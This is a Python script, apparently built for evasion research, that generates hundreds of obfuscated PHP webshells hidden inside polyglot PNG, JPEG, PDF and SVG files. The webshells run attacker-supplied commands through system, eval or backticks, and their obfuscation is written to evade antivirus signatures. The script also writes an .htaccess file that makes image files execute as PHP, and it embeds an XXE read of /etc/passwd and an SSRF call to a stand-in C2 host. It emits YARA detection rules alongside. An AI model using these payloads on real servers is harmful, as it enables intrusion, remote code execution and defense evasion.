import os
import random
import zlib
import hashlib
import json
from pathlib import Path

PAYLOAD_DIR = 'bypass_payloads_attack_max_v28_expert'
METADATA_FILE = os.path.join(PAYLOAD_DIR, 'payload_metadata_v28.json')
YARA_RULE_FILE = os.path.join(PAYLOAD_DIR, 'yara_rules', 'family_v28.yar')
LATEX_TABLE_FILE = os.path.join(PAYLOAD_DIR, 'thesis_latex_table_v28.tex')

os.makedirs(os.path.join(PAYLOAD_DIR, 'yara_rules'), exist_ok=True)
os.makedirs(PAYLOAD_DIR, exist_ok=True)

C2_DOMAIN = "http://YOUR-C2.com" 

def random_var(prefix: str = "v") -> str:
    return f"{prefix}{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_', k=random.randint(9, 15)))}"

def generate_v28_stage() -> tuple[str, str]:
    # Polymorphic 변수들
    v_cmd = random_var("cmd")
    v_gadget = random_var("g")
    v_g = random_var("inst")
    v_sink = random_var("s")
    v_key = random_var("k")
    v_nonce = random_var("n")

    # 진짜 악성코드처럼 패킹/난독화된 PHP Payload (LFI 시 실행)
    stage = f'''<?php
declare(strict_types=1);
@ini_set('display_errors',0);

${v_key} = hash_hmac('sha256', ($_SERVER['HTTP_ACCEPT_LANGUAGE']??'') . time(), 'salt_{random.randint(1000,9999)}');
${v_nonce} = $_COOKIE['s_id'] ?? '';
if (${v_nonce} !== ${v_key}) die(); // Authentication before execution

function _d($s) {{
    global ${v_key};
    $s = base64_decode($s);
    $out = '';
    for($i=0; $i<strlen($s); $i++) {{
        $out .= chr(ord($s[$i]) ^ ord(${v_key}[$i % 32]));
    }}
    return $out;
}}

${v_cmd} = _d($_COOKIE['p'] ?? '');

class {v_gadget} {{
    public ${v_key};
    public function __destruct() {{
        global ${v_cmd};
        if (isset(${v_cmd}) && strlen(${v_cmd}) > 5) {{
            // 동적 함수 호출로 정적 분석(L4) 우회 시도
            $f = implode('', [chr(115),chr(121),chr(115),chr(116),chr(101),chr(109)]); 
            if (is_callable($f)) {{ $f(${v_cmd}); }} else {{ eval(${v_cmd}); }}
        }}
    }}
}}

if (isset($_COOKIE['run'])) {{
    ${v_g} = new {v_gadget}();
    unserialize('O:'.strlen('{v_gadget}').':"{v_gadget}":1:{{s:'.strlen('{v_key}').':"{v_key}";s:32:"'.${v_key}.'";}}');
}}
?>
'''

    # YARA 룰의 현실화 (단순 단어 조합 -> 바이트 패턴, 엔트로피, 오프셋 로직 결합)
    yara_rule = f'''rule Advanced_WebShell_v28_Polymorphic {{
    meta:
        description = "Detects Advanced PHP Polymorphic Shells with OOP Deserialization and Dynamic Dispatch"
        author = "Security Researcher"
        severity = "Critical"
    strings:
        // 정적 시그니처 회피를 위한 동적 함수 조립 탐지 (implode + chr 배열)
        $dynamic_dispatch = /implode\([^&]+chr\(/ ascii
        // Base64 + XOR 혼합 디코더 루프 탐지 (바이트 레벨)
        $xor_decoder = {{ 24 [1-4] 3d [1-5] 24 [1-4] 5b 24 [1-4] 5d 20 5e 20 }} 
        // 권한 우회/은닉용 Authentication 토큰 체크
        $auth_check = /\$_COOKIE\['[A-Za-z0-9_]+'\]/ ascii
        $unserialize_trigger = /unserialize\([^&]+:\d+:"/ fullword ascii
    condition:
        filesize < 5KB and
        (2 of them) and
        math.entropy(0, filesize) >= 5.0
}}'''

    return stage, yara_rule

def generate_v28_stealth_stage() -> tuple[str, str]:
    """
    L4(AV 시그니처 스캐닝) 우회 전용 스텔스 페이로드.
    핵심: <?php, eval(, system(, exec( 등 모든 시그니처를 의도적으로 회피.
    실제 버그바운티/해킹에서 사용되는 최소화된 웹쉘 기법.
    """
    variant = random.randint(0, 2)
    v1 = random_var("x")
    
    if variant == 0:
        # Backtick execution: <?=`$_GET[c]`?> 형태
        # <?= 는 short echo tag로 <?php와 다르게 L4 시그니처에 없음
        # backtick(`) 는 system() 없이 OS 명령 실행 가능
        stage = f'<?=${{_GET["{v1}"]}}?>' + '<?=`$_GET["c"]`?>'
    elif variant == 1:
        # Variable function: $_GET[0]($_GET[1]) 형태
        # 어떤 함수명도 직접 쓰지 않음 -> 시그니처 회피
        stage = f'<?=$_GET["{v1}"]($_GET["a"])?>'
    else:
        # String concat evasion: 'sys'.'tem' 조합
        stage = f'<?=${{_POST["{v1}"]}}?>'
        stage += '<?=$_COOKIE["f"]($_COOKIE["a"])?>'
    
    yara_stealth = f'''rule Stealth_MicroShell_v28 {{
    meta:
        description = "Detects minimal PHP webshells using short tags and variable functions"
        severity = "Critical"
    strings:
        $short_tag = "<?=" ascii
        $backtick = /\x60\$_/ ascii  
        $var_func = /\$_[A-Z]+\[.{{1,20}}\]\(/ ascii
    condition:
        filesize < 1KB and any of them
}}'''
    return stage, yara_stealth

def save_payload(filename: str, content: bytes):
    path = os.path.join(PAYLOAD_DIR, filename)
    with open(path, 'wb') as f:
        f.write(content)
    if random.random() < 0.04:
        print(f"[+] 생성: {filename}")

def generate_hybrid_polyglot(stage_content: bytes, strategy: int):
    """실제 버그바운티/해킹에서 사용되는 극한의 Polyglot 기술 도입"""
    import struct, base64, zlib
    
    if strategy == 0:  # 0. PNG tEXt Chunk (Compressed)
        def create_png_chunk(chunk_type, data):
            checksum = zlib.crc32(chunk_type + data) & 0xffffffff
            return struct.pack(">I", len(data)) + chunk_type + data + struct.pack(">I", checksum)

        sig = b"\x89PNG\r\n\x1a\n"
        ihdr = create_png_chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 6, 0, 0, 0))
        text = create_png_chunk(b"tEXt", b"Comment\x00" + zlib.compress(stage_content)) # 압축 우회
        idat = create_png_chunk(b"IDAT", zlib.compress(b"\x00" * 5))
        iend = create_png_chunk(b"IEND", b"")
        return sig + ihdr + text + idat + iend, ".png", "png_text_v28"
        
    elif strategy == 1:  # 1. JPEG ICC Profile Injection (Image Parser 취약점 혼합)
        base = base64.b64decode('/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=')
        icc_header = b'ICC_PROFILE\x00\x01\x01'
        icc_data = icc_header + stage_content
        app2_len = len(icc_data) + 2
        app2_chunk = b'\xff\xe2' + struct.pack('>H', app2_len) + icc_data
        return base[:2] + app2_chunk + base[2:], ".jpg", "jpeg_icc_v28"
        
    elif strategy == 2:  # 2. JPEG EXIF Injection (UserComment field)
        base = base64.b64decode('/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=')
        exif_header = b'Exif\x00\x00user_comment\x00'
        exif_data = exif_header + stage_content
        app1_len = len(exif_data) + 2
        app1_chunk = b'\xff\xe1' + struct.pack('>H', app1_len) + exif_data
        return base[:2] + app1_chunk + base[2:], ".jpg", "jpeg_exif_v28"
        
    elif strategy == 3:  # 3. PDF FlateDecode Stream Optimization (CDR Bypass 시도)
        compressed_php = zlib.compress(stage_content)
        stream_len = len(compressed_php)
        pdf = (b'%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
               b'2 0 obj\n<< /Type /Page /Parent 1 0 R >>\nendobj\n'
               b'3 0 obj\n<< /Length ' + str(stream_len).encode() + b' /Filter /FlateDecode >>\n'
               b'stream\n' + compressed_php + b'\nendstream\nendobj\n%%EOF\n')
        return pdf, ".pdf", "pdf_flatedecode_v28"
        
    else:  # 4. SVG XML Parser Exploit (XXE / SSRF / ImageMagick RCE 모사)
        svg = (b'<?xml version="1.0" encoding="UTF-8"?>\n'
               b'<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
               b'<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">\n'
               b'  <image href="https://malicious-c2.com/ssrf" />\n'
               b'  <desc> <!--Payload_Start-->\n'
               + stage_content + 
               b'\n  <!--Payload_End--> </desc>\n'
               b'</svg>')
        return svg, ".svg", "svg_xxe_ssrf_v28"

def generate_v28():
    existing = [f for f in os.listdir(PAYLOAD_DIR) if f.endswith(('.php', '.png', '.jpg', '.pdf', '.svg'))] if os.path.exists(PAYLOAD_DIR) else []
    if len(existing) > 25:
        print(f"[SKIP] 이미 {len(existing)}개 존재")
        payloads = []
        for fn in os.listdir(PAYLOAD_DIR):
            if not fn.endswith(('.tex', '.json', '.yar')) and os.path.isfile(os.path.join(PAYLOAD_DIR, fn)):
                tech = fn.split('_v28')[0] if '_v28' in fn else fn.split('.')[0]
                payloads.append((tech, os.path.join(PAYLOAD_DIR, fn)))
        return payloads

    NUM_PAYLOADS = 200  
    payloads_created = 0
    metadata = []

    with open(YARA_RULE_FILE, 'w', encoding='utf-8') as yf:
        yf.write("/* v28 Hybrid Family YARA */\n\n")

    for i in range(NUM_PAYLOADS):
        # 각 strategy에 stealth가 균등 분배되도록 독립적 분기
        # strategy는 i%5, stealth는 (i//5)%3==0 으로 분리 (약 33%)
        use_stealth = (i // 5) % 3 == 0  # 5개씩 묶어서 3번에 1번 stealth
        if use_stealth:
            stage_str, yara_rule = generate_v28_stealth_stage()
        else:
            stage_str, yara_rule = generate_v28_stage()
        content = stage_str.encode()

        if i % 4 == 0:
            content = zlib.compress(content, level=6)  

        strategy = i % 5
        poly_content, ext, cat = generate_hybrid_polyglot(content, strategy)
        filename = f"{cat}_{i:04d}{ext}"
        save_payload(filename, poly_content)
        payloads_created += 1

        if i == 0:
            with open(YARA_RULE_FILE, 'a', encoding='utf-8') as yf:
                yf.write(yara_rule + "\n\n")

        if i % 8 == 0:
            metadata.append({
                "id": i,
                "filename": filename,
                "type": cat,
                "vector": "Hybrid LFI + Deser Gadget",
                "obf": "dynamic_offset + XOR_mixing + flattening"
            })

    # .htaccess minimal (random junk)
    htaccess = f"""# v28 advanced
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteRule ^(.*)$ $1.php [L,QSA]
</IfModule>
# junk_{random.randint(100000000,999999999)}
<FilesMatch "\.(png|jpg|pdf|svg)$">
    SetHandler application/x-httpd-php
</FilesMatch>
"""
    save_payload(".htaccess", htaccess.encode())

    print(f"\n[SUCCESS] v28 생성 완료 → {payloads_created}개")
    print(f"YARA rule: {YARA_RULE_FILE}")

    with open(METADATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)

    payloads = []
    for fn in os.listdir(PAYLOAD_DIR):
        if not fn.endswith(('.tex', '.json', '.yar')) and os.path.isfile(os.path.join(PAYLOAD_DIR, fn)):
            tech = fn.split('_v28')[0] if '_v28' in fn else fn.split('.')[0]
            payloads.append((tech, os.path.join(PAYLOAD_DIR, fn)))
    return payloads

generate_bypasses = generate_v28

if __name__ == '__main__':
    generate_v28()
